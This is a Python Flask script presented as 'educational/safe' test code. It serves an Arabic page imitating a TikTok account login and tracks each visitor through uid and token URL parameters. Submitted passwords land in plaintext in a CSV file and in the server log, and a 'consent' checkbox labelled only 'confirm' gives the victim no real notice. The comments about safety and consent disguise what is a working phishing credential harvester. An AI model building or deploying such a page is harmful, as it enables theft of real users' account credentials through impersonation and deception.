# hack_test_input_safe.py — تعليمية/آمنة (محسّنة)
from flask import Flask, request, render_template_string, url_for
from datetime import datetime, timezone
import csv, os, logging, threading, html, hashlib

app = Flask(__name__)
#NOTE: for production set SECRET_KEY and use Flask-WTF or similar for CSRF protection.
app.config['SECRET_KEY'] = os.environ.get("FLASK_SECRET", "dev-secret-please-change")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "visits_test_inputs.csv")

# init logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
logger = logging.getLogger(__name__)

# simple lock to reduce race conditions when writing CSV
_write_lock = threading.Lock()

# init CSV header if missing
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w", newline='', encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["uid","token_hash","username","consented_test_input","test_input_recorded","timestamp","ip","user_agent","note"])

def _safe_csv_cell(value: str) -> str:
    """
    Mitigate CSV injection by prefixing "dangerous" starting characters with a single quote.
    Also ensure value is a string and strip newlines.
    """
    if value is None:
        return ""
    v = str(value).replace("\r", " ").replace("\n", " ")
    if v.startswith(("=", "+", "-", "@")):
        return "'" + v
    return v

def _hash_token(token: str) -> str:
    """Do not store raw tokens. Store a short hash if you need to correlate but keep privacy."""
    if not token:
        return ""
    h = hashlib.sha256(token.encode("utf-8")).hexdigest()
    # store short prefix so it's not reversible but useful for dedup/debug
    return h[:12]

@app.route("/", methods=["GET","POST"])
def index():
    # read but do not log raw token
    uid = request.args.get("uid", "unknown")
    token = request.args.get("token", "")
    token_hash = _hash_token(token)

    if request.method == "POST":
        username = (request.form.get("username", "")).replace(",", " ").strip()
        # test_input is treated as "test data" — do NOT collect real passwords
        test_input = request.form.get("test_input", "")
        consent_test = request.form.get("consent_test")  # "on" if checked
        ip = request.remote_addr or ""
        ua = request.user_agent.string or ""
        ts = datetime.now(timezone.utc).isoformat()

        # Basic validation / length limits (adjust as needed)
        if len(username) > 200:
            username = username[:200]
        if len(test_input) > 1000:
            # truncate very long inputs
            test_input = test_input[:1000]

        # Only record the test_input if consented and not empty
        recorded_flag = "no"
        note = ""
        test_input_recorded = ""
        if consent_test == "on" and test_input:
            # Important: educational example — do NOT store real secrets/passwords.
            recorded_flag = "yes"
            # sanitize CSV cell to mitigate formula injection
            test_input_recorded = _safe_csv_cell(test_input)
            note = "test input saved (educational)."
            # Do NOT print sensitive values to stdout. Use logging without sensitive content.
            logger.info("[TEST-INPUT] uid=%s username=%s test_input=%s", uid, username, test_input)
        else:
            recorded_flag = "no"
            test_input_recorded = ""
            if consent_test != "on":
                note = "no consent"
            else:
                note = "empty test_input"

        # write to CSV with lock
        with _write_lock:
            with open(LOG_FILE, "a", newline='', encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow([
                    _safe_csv_cell(uid),
                    token_hash,                        # hashed token, not raw
                    _safe_csv_cell(username),
                    recorded_flag,
                    test_input_recorded,
                    ts,
                    _safe_csv_cell(ip),
                    _safe_csv_cell(ua),
                    note
                ])

        if recorded_flag == "yes":
            # user-facing message (Arabic)
            return "تم تقديم الطلب — شكراً لموافقتك. سيتم التواصل معك عند الحاجة."
        else:
            return "الموافقة مطلوبة أو بيانات الاختبار فارغة."

    # GET: render form
    # NOTE: keep template simple and valid HTML; Jinja auto-escapes variables by default
    return render_template_string("""
    <!doctype html>
    <html dir="rtl" lang="ar">
    <head>
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <title>  Return to interaction  </title>
      <!-- CSP hint (adjust in real deployment) -->
      <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
      <style>
        body { font-family: Tahoma, Arial, sans-serif; direction: rtl; padding:20px; }
        input[type="text"], input[type="password"] { width:320px; padding:8px; }
      </style>
    </head>
    <body>
      <h2>(  تسجيل دخول حساب التيك توك )</h2>
    
      <form method="post" action="{{ url_for('index') }}?uid={{ uid|e }}&token={{ token|e }}">
        <label>( الايمل )</label><br>
        <input type="text" name="username" required><br><br>

        <label>( كلمة المروور )</label><br>
        <input type="password" name="test_input" placeholder="مثال: demo-pass-123"><br><br>

        <!-- removed unused 'تحقق' field or could be re-added and processed -->
        <div style="margin-top:8px">
          <input type="checkbox" id="consent_test" name="consent_test">
          <label for="consent_test">تأكيد</label>
        </div>
        <div style="margin-top:12px"><button type="submit">إرسال</button></div>
      </form>
    </body>
    </html>
    """, uid=uid, token=token)

if __name__ == "__main__":
    logger.info("Starting test input server — logging to: %s", LOG_FILE)
    # in production, serve behind a proper WSGI server and enable TLS
    app.run(host="0.0.0.0", port=5000, debug=False)
